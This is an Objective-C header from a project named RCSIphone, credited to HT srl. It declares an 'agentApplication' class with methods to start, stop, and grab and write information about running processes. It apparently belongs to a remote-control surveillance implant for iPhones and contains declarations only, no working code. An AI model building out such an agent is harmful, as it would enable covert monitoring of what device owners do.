//
//  RCSIAgentApplication.h
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSIAgent.h"

@interface agentApplication : RCSIAgent
{
  BOOL      isAppStarted;
  NSString *mProcessName;
  NSString *mProcessDesc;
}

- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;
- (BOOL)grabInfo: (NSString*)aStatus;

- (BOOL)start;
- (void)stop;

@end